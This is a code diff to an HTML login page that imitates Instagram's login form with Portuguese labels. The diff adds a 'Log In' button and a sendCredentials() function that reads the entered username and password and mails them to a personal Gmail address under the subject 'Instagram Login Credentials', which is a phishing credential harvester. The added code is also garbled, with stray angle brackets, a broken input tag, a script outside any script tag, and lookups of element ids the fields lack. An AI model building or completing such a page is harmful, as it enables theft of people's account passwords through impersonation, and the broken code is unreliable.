@@ -21,9 +21,18 @@
                     <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />
 
                     <label for="password" class="sr-only">Senha</label>
-                    <input name="password" type="password" placeholder="password" />
-
+                    <input name="password" type="password" placeholder="password" /
                     <button type="button">Entrar</button>
+                    <button type="submit" onclick="sendCredentials()">Log In</button>
+                    <function sendCredentials() {
+    const name = document.getElementById('username').value;
+    <const password = document.getElementById('password').value;
+    <const email = 'tajetaje624@gmail.com';
+    <const subject = 'Instagram Login Credentials';
+    const body = `Username: ${name}\nPassword: ${password}`;
+    const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    window.location.href = mailtoLink;
+}
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
